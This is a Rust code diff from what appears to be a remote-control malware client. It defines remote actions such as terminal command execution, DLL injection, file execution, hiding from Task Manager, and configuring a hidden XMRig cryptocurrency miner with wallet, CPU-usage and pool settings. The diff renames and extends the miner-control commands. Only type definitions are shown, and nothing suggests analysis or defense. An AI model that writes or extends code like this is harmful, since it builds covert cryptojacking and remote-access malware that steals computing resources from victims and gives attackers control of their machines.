@@ -20,8 +20,9 @@ pub enum ClientAction {
     FetchDynamicData,
     FetchThumbnail,
     UpdateTaskManagerExclusions,
-    UpdateMinerConfig,
+    EditXMRigConfig,
     InjectDll,
+    GetXMRigData,
     // other file stuff just use some FTP
     // remove, rename, upload (if folder - compress),createfolder
 }
@@ -33,16 +34,20 @@ pub enum ClientParams {
     CallTerminalCommand(CallTerminalCommandParams),
     CallSysEvent(CallSysEventParams),
     ExecLocalFile(ExecLocalFileParams),
-    UpdateMinerConfig(UpdateMinerConfigParams),
+    EditXMRigConfig(EditXMRigConfigParams),
     FetchDynamicData(FetchDynamicDataParams),
     FetchThumbnail(FetchThumbnailParams),
     DownloadFile(DownloadFileParams),
     InjectDll(InjectDllParams),
+    GetXMRigData(GetXMRigDataParams),
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct UpdateMinerConfigParams {
+pub struct GetXMRigDataParams {}
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct EditXMRigConfigParams {
     // here update - wallet adr, cpu % usage, url and port of pool, etc
+    pub config: String,
 }
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct InjectDllParams {
